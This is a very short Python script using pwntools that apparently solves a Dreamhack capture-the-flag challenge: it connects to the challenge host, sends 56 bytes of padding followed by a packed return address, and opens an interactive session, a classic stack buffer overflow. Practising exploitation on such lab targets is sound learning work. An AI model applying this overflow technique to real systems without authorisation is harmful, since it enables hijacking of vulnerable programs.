from pwn import *

# 원격 서버 연결
p = remote("host3.dreamhack.games", 19681)
p.recvuntil("Input: ")

payload = b"A" * 8 * 7
payload += p64(0x000000000000004006aa)

p.send(payload)
p.interactive()
